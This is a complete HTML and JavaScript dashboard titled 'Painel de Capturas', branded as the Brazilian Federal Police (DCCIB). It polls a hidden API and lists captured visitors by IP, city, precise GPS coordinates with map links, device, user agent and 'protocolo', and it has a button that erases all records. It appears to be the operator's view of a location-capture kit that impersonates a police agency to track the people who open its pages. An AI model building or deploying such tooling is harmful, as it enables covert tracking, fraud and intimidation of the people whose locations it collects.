<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <title>Painel de Capturas — DCCIB</title>
  <style>
    :root { --pf-blue: #0a2e5c; --pf-blue2: #123c74; --gold: #c9a227; }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', Roboto, -apple-system, sans-serif;
      background: linear-gradient(160deg, #050a14 0%, #0a1524 45%, #0d1b30 100%);
      color: #d7e2ef; min-height: 100vh; padding: 24px 14px 60px;
    }
    .wrap { max-width: 1100px; margin: 0 auto; }
    .topo { display: flex; align-items: center; gap: 14px; margin-bottom: 20px; flex-wrap: wrap; }
    .selo {
      width: 48px; height: 48px; border-radius: 50%;
      background: radial-gradient(circle at 32% 28%, #1d5aa8, #0a2e5c 70%);
      border: 3px solid var(--gold); display: flex; align-items: center; justify-content: center;
      box-shadow: 0 0 24px rgba(201,162,39,.3); flex-shrink: 0;
    }
    .selo span { color: var(--gold); font-weight: 900; font-size: .62rem; letter-spacing: .1em; text-align: center; }
    .topo h1 { color: #fff; font-size: 1.1rem; letter-spacing: .08em; }
    .topo p { color: #8fa6c0; font-size: .74rem; margin-top: 2px; }
    .acoes { margin-left: auto; display: flex; gap: 10px; }
    .btn {
      background: var(--pf-blue2); color: #dce8f7; border: 1px solid rgba(120,160,210,.3);
      padding: 9px 16px; border-radius: 8px; cursor: pointer; font-family: inherit; font-size: .8rem; font-weight: 700;
      text-decoration: none; display: inline-flex; align-items: center; gap: 7px;
    }
    .btn:hover { background: #1a4a8a; }
    .btn.danger { background: rgba(220,38,38,.16); border-color: rgba(220,38,38,.45); color: #ffb4b4; }
    .painel {
      background: #0c1626; border: 1px solid rgba(120,160,210,.22); border-radius: 14px;
      box-shadow: 0 30px 80px rgba(0,0,0,.7); overflow: hidden;
    }
    .painel-head {
      background: linear-gradient(135deg, var(--pf-blue) 0%, var(--pf-blue2) 100%);
      padding: 14px 20px; border-bottom: 2px solid var(--gold);
      display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px;
    }
    .painel-head b { color: #fff; font-size: .92rem; letter-spacing: .06em; }
    .painel-head .contador { color: var(--gold); font-size: .8rem; font-weight: 700; }
    .tabela-scroll { overflow-x: auto; }
    table { width: 100%; border-collapse: collapse; min-width: 940px; }
    th {
      text-align: left; font-size: .64rem; text-transform: uppercase; letter-spacing: .1em;
      color: #7f95b1; padding: 12px 14px; border-bottom: 1px solid rgba(120,160,210,.2);
      background: rgba(18,60,116,.18);
    }
    td { padding: 12px 14px; border-bottom: 1px solid rgba(120,160,210,.1); font-size: .84rem; color: #c3d3e6; vertical-align: top; }
    tr:hover td { background: rgba(18,60,116,.12); }
    td b { color: #fff; }
    .tag-gps { display: inline-block; padding: 2px 9px; border-radius: 99px; font-size: .68rem; font-weight: 800; }
    .tag-gps.ok { background: rgba(22,101,52,.3); color: #6ee7a0; }
    .tag-gps.negado { background: rgba(220,38,38,.18); color: #ff9c9c; }
    .coords a { color: #7ab8ff; text-decoration: none; }
    .coords a:hover { text-decoration: underline; }
    .vazio { text-align: center; padding: 50px 20px; color: #6d84a0; font-size: .9rem; }
    .mapa-link { color: #7ab8ff; font-size: .76rem; text-decoration: none; display: inline-block; margin-top: 3px; }
    .mapa-link:hover { text-decoration: underline; }
    @media (max-width: 640px) {
      .acoes { margin-left: 0; width: 100%; }
      .btn { flex: 1; justify-content: center; }
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="topo">
      <div class="selo"><span>POLÍCIA<br/>FEDERAL</span></div>
      <div>
        <h1>SISTEMA DE MONITORAMENTO — DCCIB</h1>
        <p>Registros de captura de localização · acesso restrito</p>
      </div>
      <div class="acoes">
        <button class="btn" onclick="carregar()" id="btnAtualizar">↻ Atualizar</button>
        <button class="btn danger" onclick="limpar()">🗑 Limpar tudo</button>
      </div>
    </div>

    <div class="painel">
      <div class="painel-head">
        <b>CAPTURAS REGISTRADAS</b>
        <span class="contador" id="contador">—</span>
      </div>
      <div class="tabela-scroll">
        <table>
          <thead>
            <tr>
              <th>Data/hora</th>
              <th>IP</th>
              <th>Cidade / UF</th>
              <th>GPS preciso</th>
              <th>Dispositivo</th>
              <th>User agent</th>
              <th>Protocolo</th>
            </tr>
          </thead>
          <tbody id="tbody">
            <tr><td colspan="7" class="vazio">Carregando…</td></tr>
          </tbody>
        </table>
      </div>
    </div>
  </div>

  <script>
    window.CAPTURA_LISTA_URL = window.CAPTURA_LISTA_URL && window.CAPTURA_LISTA_URL.indexOf("__CAPTURA_") === -1 ? window.CAPTURA_LISTA_URL : "/monitoramento/api/lista";
    window.CAPTURA_LIMPAR_URL = window.CAPTURA_LIMPAR_URL && window.CAPTURA_LIMPAR_URL.indexOf("__CAPTURA_") === -1 ? window.CAPTURA_LIMPAR_URL : "/monitoramento/api/limpar";
    function esc(t) {
      return String(t == null ? "" : t).replace(/[&<>"']/g, function (c) {
        return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
      });
    }
    function linkMaps(lat, lon) {
      return "https://www.google.com/maps?q=" + lat + "," + lon;
    }
    async function carregar() {
      var tbody = document.getElementById("tbody");
      try {
        var r = await fetch(window.CAPTURA_LISTA_URL);
        var d = await r.json();
        if (!d.ok) throw new Error("erro");
        document.getElementById("contador").textContent = (d.registros.length) + " registro(s)";
        if (!d.registros.length) {
          tbody.innerHTML = '<tr><td colspan="7" class="vazio">Nenhuma captura registrada ainda.</td></tr>';
          return;
        }
        var html = "";
        for (var i = 0; i < d.registros.length; i++) {
          var g = d.registros[i];
          var dt = g.criado_em ? new Date(g.criado_em.replace(" ", "T") + "Z").toLocaleString("pt-BR") : "—";
          var gpsTag = g.gps_lat != null
            ? '<span class="tag-gps ok">CAPTURADO</span><br/><span class="coords"><a href="' + linkMaps(g.gps_lat, g.gps_lon) + '" target="_blank" rel="noopener">' + g.gps_lat.toFixed(5) + ", " + g.gps_lon.toFixed(5) + "</a> (±" + Math.round(g.gps_acc) + 'm)</span><a class="mapa-link" href="' + linkMaps(g.gps_lat, g.gps_lon) + '" target="_blank" rel="noopener">📍 abrir no mapa</a>'
            : '<span class="tag-gps negado">' + (g.gps_erro === "negado" ? "NEGADO" : "INDISPONÍVEL") + "</span>";
          var local = esc(g.cidade || "—") + " / " + esc(g.uf || "—");
          if (g.gps_lat != null) local += '<br/><a class="mapa-link" href="' + linkMaps(g.gps_lat, g.gps_lon) + '" target="_blank" rel="noopener">📍 mapa</a>';
          html += "<tr>" +
            "<td><b>" + esc(dt) + "</b></td>" +
            "<td>" + esc(g.ip || "—") + "</td>" +
            "<td>" + local + "</td>" +
            "<td>" + gpsTag + "</td>" +
            "<td>" + esc(g.dispositivo || "—") + "</td>" +
            '<td style="max-width:220px;word-break:break-all;font-size:.72rem">' + esc(g.user_agent || "—") + "</td>" +
            "<td>" + esc(g.protocolo || "—") + "</td>" +
            "</tr>";
        }
        tbody.innerHTML = html;
      } catch (e) {
        tbody.innerHTML = '<tr><td colspan="7" class="vazio">Erro ao carregar registros.</td></tr>';
      }
    }
    async function limpar() {
      if (!confirm("Apagar TODOS os registros de captura? Esta ação não pode ser desfeita.")) return;
      await fetch(window.CAPTURA_LIMPAR_URL, { method: "POST" });
      carregar();
    }
    carregar();
    setInterval(carregar, 15000); // atualiza a cada 15s
  </script>
</body>
</html>
